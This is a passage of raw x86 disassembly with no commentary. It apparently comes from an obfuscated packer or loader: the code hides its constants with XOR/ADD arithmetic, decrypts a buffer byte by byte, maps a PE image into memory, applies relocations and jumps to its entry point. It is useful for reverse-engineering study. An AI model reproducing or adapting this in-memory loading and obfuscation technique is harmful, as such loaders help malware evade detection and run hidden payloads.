  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
